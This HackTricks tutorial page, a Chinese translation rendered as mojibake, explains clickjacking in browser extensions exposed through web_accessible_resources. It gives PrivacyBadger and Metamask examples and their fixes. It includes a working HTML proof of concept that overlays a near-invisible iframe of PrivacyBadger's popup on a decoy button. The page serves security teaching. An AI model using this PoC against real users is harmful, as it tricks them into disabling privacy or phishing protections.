# BrowExt - ClickJacking

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## åŸºæœ¬ä¿¡æ¯

æœ¬é¡µé¢å°†åˆ©ç”¨æµè§ˆå™¨æ‰©å±•ä¸­çš„ ClickJacking æ¼æ´ã€‚\
å¦‚æœä½ ä¸çŸ¥é“ ClickJacking æ˜¯ä»€ä¹ˆï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../clickjacking.md" %}
[clickjacking.md](../clickjacking.md)
{% endcontent-ref %}

æ‰©å±•åŒ…å«æ–‡ä»¶ **`manifest.json`**ï¼Œè¯¥ JSON æ–‡ä»¶æœ‰ä¸€ä¸ªå­—æ®µ `web_accessible_resources`ã€‚ä»¥ä¸‹æ˜¯ [Chrome æ–‡æ¡£](https://developer.chrome.com/extensions/manifest/web\_accessible\_resources) å¯¹æ­¤çš„è¯´æ˜ï¼š

> è¿™äº›èµ„æºå°†é€šè¿‡ URL **`chrome-extension://[PACKAGE ID]/[PATH]`** åœ¨ç½‘é¡µä¸­å¯ç”¨ï¼Œå¯ä»¥é€šè¿‡ **`extension.getURL method`** ç”Ÿæˆã€‚å…è®¸çš„èµ„æºä¼šå¸¦æœ‰é€‚å½“çš„ CORS å¤´ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ XHR ç­‰æœºåˆ¶è®¿é—®ã€‚[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

æµè§ˆå™¨æ‰©å±•ä¸­çš„ **`web_accessible_resources`** ä¸ä»…å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ï¼›å®ƒä»¬è¿˜å…·æœ‰æ‰©å±•çš„å›ºæœ‰æƒé™ã€‚è¿™æ„å‘³ç€å®ƒä»¬èƒ½å¤Ÿï¼š

* æ›´æ”¹æ‰©å±•çš„çŠ¶æ€
* åŠ è½½é¢å¤–çš„èµ„æº
* åœ¨ä¸€å®šç¨‹åº¦ä¸Šä¸æµè§ˆå™¨äº¤äº’

ç„¶è€Œï¼Œè¿™ä¸€ç‰¹æ€§å¸¦æ¥äº†å®‰å…¨é£é™©ã€‚å¦‚æœ **`web_accessible_resources`** ä¸­çš„æŸä¸ªèµ„æºå…·æœ‰ä»»ä½•é‡è¦åŠŸèƒ½ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šå°†è¯¥èµ„æºåµŒå…¥åˆ°å¤–éƒ¨ç½‘é¡µä¸­ã€‚æ¯«ä¸çŸ¥æƒ…çš„ç”¨æˆ·è®¿é—®æ­¤é¡µé¢æ—¶ï¼Œå¯èƒ½ä¼šæ— æ„ä¸­æ¿€æ´»æ­¤åµŒå…¥çš„èµ„æºã€‚è¿™ç§æ¿€æ´»å¯èƒ½ä¼šå¯¼è‡´æ„æƒ³ä¸åˆ°çš„åæœï¼Œå…·ä½“å–å†³äºæ‰©å±•èµ„æºçš„æƒé™å’Œèƒ½åŠ›ã€‚

## PrivacyBadger ç¤ºä¾‹

åœ¨æ‰©å±• PrivacyBadger ä¸­ï¼Œå‘ç°äº†ä¸€ä¸ªä¸ `skin/` ç›®å½•è¢«å£°æ˜ä¸º `web_accessible_resources` ç›¸å…³çš„æ¼æ´ï¼Œå…·ä½“å¦‚ä¸‹ï¼ˆæŸ¥çœ‹åŸå§‹ [åšå®¢æ–‡ç« ](https://blog.lizzie.io/clickjacking-privacy-badger.html)ï¼‰ï¼š
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
æ­¤é…ç½®å¯¼è‡´äº†æ½œåœ¨çš„å®‰å…¨é—®é¢˜ã€‚å…·ä½“æ¥è¯´ï¼Œ`skin/popup.html` æ–‡ä»¶åœ¨ä¸æµè§ˆå™¨ä¸­çš„ PrivacyBadger å›¾æ ‡äº¤äº’æ—¶å‘ˆç°ï¼Œå¯ä»¥åµŒå…¥åœ¨ `iframe` ä¸­ã€‚æ­¤åµŒå…¥å¯èƒ½è¢«åˆ©ç”¨æ¥æ¬ºéª—ç”¨æˆ·æ— æ„ä¸­ç‚¹å‡»â€œä¸ºæ­¤ç½‘ç«™ç¦ç”¨ PrivacyBadgerâ€ã€‚è¿™æ ·çš„è¡Œä¸ºå°†é€šè¿‡ç¦ç”¨ PrivacyBadger ä¿æŠ¤æ¥å±å®³ç”¨æˆ·çš„éšç§ï¼Œå¹¶å¯èƒ½ä½¿ç”¨æˆ·é¢ä¸´æ›´é«˜çš„è·Ÿè¸ªé£é™©ã€‚æ­¤æ¼æ´çš„è§†è§‰æ¼”ç¤ºå¯ä»¥åœ¨ [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm) æä¾›çš„ ClickJacking è§†é¢‘ç¤ºä¾‹ä¸­æŸ¥çœ‹ã€‚

ä¸ºäº†è§£å†³æ­¤æ¼æ´ï¼Œå®æ–½äº†ä¸€ä¸ªç®€å•çš„è§£å†³æ–¹æ¡ˆï¼šä» `web_accessible_resources` åˆ—è¡¨ä¸­ç§»é™¤ `/skin/*`ã€‚æ­¤æ›´æ”¹æœ‰æ•ˆåœ°é™ä½äº†é£é™©ï¼Œç¡®ä¿ `skin/` ç›®å½•çš„å†…å®¹æ— æ³•é€šè¿‡ç½‘ç»œå¯è®¿é—®èµ„æºè¿›è¡Œè®¿é—®æˆ–æ“æ§ã€‚

ä¿®å¤å¾ˆç®€å•ï¼š**ä» `web_accessible_resources` ä¸­ç§»é™¤ `/skin/*`**ã€‚

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}

</style>

<div id="stuff">
<h1>
Click the button
</h1>
<button id="button">
click me
</button>
</div>

<iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Metamask ç¤ºä¾‹

ä¸€ä¸ªå…³äº Metamask ä¸­ ClickJacking çš„ [**åšå®¢æ–‡ç« å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒMetamask é€šè¿‡æ£€æŸ¥è®¿é—®æ‰€ä½¿ç”¨çš„åè®®æ˜¯å¦ä¸º **`https:`** æˆ– **`http:`**ï¼ˆè€Œä¸æ˜¯ **`chrome:`** ä¾‹å¦‚ï¼‰æ¥ä¿®å¤è¯¥æ¼æ´ï¼š

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

**åœ¨ Metamask æ‰©å±•ä¸­ä¿®å¤çš„å¦ä¸€ä¸ª ClickJacking** æ˜¯ç”¨æˆ·èƒ½å¤Ÿåœ¨é¡µé¢è¢«æ€€ç–‘ä¸ºé’“é±¼æ—¶ **ç‚¹å‡»ç™½åå•**ï¼Œå› ä¸º `â€œweb_accessible_resourcesâ€: [â€œinpage.jsâ€, â€œphishing.htmlâ€]`ã€‚ç”±äºè¯¥é¡µé¢æ˜“å— Clickjacking æ”»å‡»ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®ƒæ˜¾ç¤ºä¸€äº›æ­£å¸¸çš„å†…å®¹ï¼Œä½¿å—å®³è€…åœ¨æœªæ³¨æ„çš„æƒ…å†µä¸‹ç‚¹å‡»ä»¥å°†å…¶åˆ—å…¥ç™½åå•ï¼Œç„¶åè¿”å›åˆ°å°†è¢«åˆ—å…¥ç™½åå•çš„é’“é±¼é¡µé¢ã€‚

## Steam Inventory Helper ç¤ºä¾‹

æŸ¥çœ‹ä»¥ä¸‹é¡µé¢ä»¥æ£€æŸ¥æµè§ˆå™¨æ‰©å±•ä¸­çš„ **XSS** å¦‚ä½•ä¸ **ClickJacking** æ¼æ´é“¾å¼ç»“åˆï¼š

{% content-ref url="browext-xss-example.md" %}
[browext-xss-example.md](browext-xss-example.md)
{% endcontent-ref %}

## å‚è€ƒæ–‡çŒ®

* [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
* [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨ Twitter ä¸Šå…³æ³¨** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
